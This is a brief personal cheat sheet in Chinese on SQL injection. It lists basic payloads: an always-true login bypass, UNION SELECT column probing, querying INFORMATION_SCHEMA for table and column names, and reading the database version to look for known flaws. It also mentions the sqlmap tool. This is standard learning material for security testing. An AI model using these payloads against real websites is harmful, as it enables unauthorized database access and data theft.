# cheetsheet

## SQL Injection

1. 最簡單語法 
' or 1=1 # (# 代表後方皆省略)

2. UNION 可以將兩個 SELECT 結合在一起查詢
'UNION SELECT 1,2,3,4# (用這個可以慢慢找出欄位數)
'UNION SELECT ORDER BY 2# (與上方同理)

3. 系統資訊結構描述
一般 SQL 資料庫中都會有一個表格是 "系統資訊結構描述" ，表格名為 Information Schema，亦可透過 UNION 方式檢視 Table Name、Column Name
'UNION SELECT  TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS#

4. 查出資料庫版本、資料庫名稱
透過版本直接上網查是不是有已知漏洞可以打
'UNION SELECT @@version,database()#

5. SQL 檢測工具 - SQLMAP (未用過)
此工具用來檢視是否有 SQL Injection，程式將 SQL Injection 攻擊語法集結而成，透過此可對網站進行滲透


